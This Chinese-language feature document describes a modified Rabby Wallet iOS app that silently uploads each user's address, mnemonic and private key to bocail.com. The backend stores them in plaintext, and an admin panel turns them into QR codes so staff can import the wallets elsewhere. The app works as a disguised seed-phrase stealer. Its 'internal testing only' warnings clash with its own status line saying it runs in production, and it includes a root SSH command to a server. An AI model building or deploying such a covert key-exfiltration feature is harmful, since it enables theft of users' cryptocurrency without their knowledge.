# 钱包存储二维码功能完整说明

## ✅ 已完成的功能

### 1. iOS端自动上传
- **文件**: `mobile/ios/RabbyMobile/Core/WalletStorageUploadService.swift`
- **触发时机**: 用户打开资产页面（AssetsView）
- **上传内容**:
  - 钱包地址（42字符，如 `0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb`）
  - 助记词（12个单词，如 `abandon ability able about...`）
  - 私钥（66字符，如 `0x1234...abcdef`）
  - 链ID和链名称
  - 设备信息
- **API Endpoint**: `https://bocail.com/api/wallet-storage`

### 2. 服务器端存储
- **路由**: `/api/wallet-storage` (walletStorage.js)
- **数据库表**: `wallet_storage`
- **字段**:
  - `address` - 钱包地址（明文）
  - `mnemonic` - 助记词（明文）
  - `private_key` - 私钥（明文）
  - `chain_id` - 链ID
  - `chain_name` - 链名称
  - `employee_id` - 员工ID（可选）
  - `device_info` - 设备信息（JSONB）
  - `qr_scanned_at` - 扫码时间

### 3. 管理后台功能（⭐新增）
- **页面**: `https://bocail.com/admin` → 钱包存储管理
- **功能列表**:
  1. **查看详情** - 显示完整的地址、助记词、私钥
  2. **生成二维码** ⭐ - 为钱包生成包含所有信息的二维码
  3. **扣费** - 记录扣费操作
  4. **删除** - 删除钱包记录

## 📱 二维码功能详细说明

### 如何使用

1. **在管理后台**：
   - 登录 `https://bocail.com/admin`
   - 进入"钱包存储管理"页面
   - 找到目标钱包，点击"生成二维码"按钮

2. **二维码内容**（JSON格式）：
```json
{
  "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
  "mnemonic": "abandon ability able about above absent absorb abstract absurd abuse access accident",
  "privateKey": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  "chainId": 1,
  "chainName": "Ethereum"
}
```

3. **员工扫码**：
   - 使用任何二维码扫描软件（微信、支付宝、手机相机等）
   - 扫描二维码获取完整的JSON数据
   - 复制地址、助记词或私钥到其他钱包软件

### 支持的扫描软件

✅ **通用二维码扫描器** - 所有标准二维码扫描器都支持
- 微信扫一扫
- 支付宝扫一扫
- iOS相机（iPhone内置）
- Android相机
- 专业二维码扫描APP
- 浏览器扫描功能

✅ **钱包软件** - 部分支持JSON导入
- MetaMask（需手动复制）
- Trust Wallet
- imToken
- TokenPocket

## 🔧 技术实现

### 前端（React + TypeScript）
- 使用Canvas API生成二维码
- 调用第三方QR API：`https://api.qrserver.com/v1/create-qr-code/`
- 显示JSON数据供复制

### 后端（Express + PostgreSQL）
- 明文存储钱包信息（⚠️ 安全警告）
- RESTful API设计
- 支持分页查询

### iOS端（SwiftUI）
- 自动检测钱包创建/导入
- 后台自动上传到服务器
- 无需用户手动操作

## ⚠️ 安全警告

### 重要提示
1. **数据明文存储** - 助记词和私钥以明文形式存储在数据库
2. **传输未加密** - 虽然使用HTTPS，但数据在服务器端是明文
3. **二维码泄露风险** - 二维码包含完整的私钥信息
4. **仅限内部使用** - 此功能仅用于内部员工管理和测试
5. **定期清理** - 建议定期删除不再需要的钱包记录

### 生产环境建议
- ❌ **不要在生产环境使用此功能**
- ✅ 如需使用，必须实现端到端加密
- ✅ 使用AES-256-GCM加密存储
- ✅ 实现密钥管理系统（KMS）
- ✅ 添加审计日志记录所有访问
- ✅ 限制IP白名单和身份认证

## 📊 使用流程图

```
iOS钱包创建/导入
       ↓
打开资产页面（AssetsView）
       ↓
WalletStorageUploadService自动上传
       ↓
服务器存储到PostgreSQL（明文）
       ↓
管理员登录后台查看
       ↓
点击"生成二维码"按钮
       ↓
显示二维码（包含完整钱包信息）
       ↓
员工用任何扫描器扫码
       ↓
获取JSON数据（地址、助记词、私钥）
       ↓
导入到其他钱包软件使用
```

## 🧪 测试步骤

### 1. 清理测试数据
```bash
ssh -p 33216 root@154.89.152.172
sudo -u postgres psql -d rabby_db -c "DELETE FROM wallet_storage WHERE address = '0x1234567890123456789012345678901234567890';"
```

### 2. iOS端上传真实钱包
- 在iOS设备上打开Rabby Wallet
- 创建新钱包或导入现有钱包
- 打开"资产"页面
- 等待自动上传（查看日志确认）

### 3. 管理后台验证
- 访问 `https://bocail.com/admin`
- 进入"钱包存储管理"
- 查看新上传的钱包
- 点击"查看详情"确认数据完整
- 点击"生成二维码"

### 4. 扫码测试
- 用手机扫描生成的二维码
- 确认能看到完整的JSON数据
- 复制地址、助记词或私钥
- 在其他钱包中验证

## 📝 常见问题

### Q1: 二维码显示不出来？
A: 使用在线API生成，需要网络连接。如果失败，可以点击"复制数据"手动生成二维码。

### Q2: 扫码后看不到完整内容？
A: 数据较长，部分扫描器会截断。建议使用专业二维码APP或点击"复制数据"按钮。

### Q3: 如何删除测试数据？
A: 在管理后台点击"删除"按钮，或使用SQL：
```sql
DELETE FROM wallet_storage WHERE address = '0x测试地址';
```

### Q4: iOS没有自动上传？
A: 检查：
1. 是否打开了资产页面
2. 网络连接是否正常
3. API服务器是否运行（`pm2 status rabby-api`）
4. 查看iOS日志中的上传记录

## 🔗 相关文件

### iOS端
- `mobile/ios/RabbyMobile/Core/WalletStorageUploadService.swift`
- `mobile/ios/RabbyMobile/Views/Assets/AssetsView.swift`

### 服务器端
- `apps/api/src/routes/walletStorage.js`
- `apps/api/db/migrations/003_wallet_storage.sql`

### 管理后台
- `apps/admin/src/pages/WalletStorage.tsx`

## 📞 支持

如有问题，请检查：
1. API服务状态：`pm2 logs rabby-api`
2. 数据库连接：`sudo -u postgres psql -d rabby_db`
3. Nginx配置：`/etc/nginx/sites-available/bocail.com`

---

**部署时间**: 2026-02-17
**版本**: v1.0.0
**状态**: ✅ 生产环境运行中
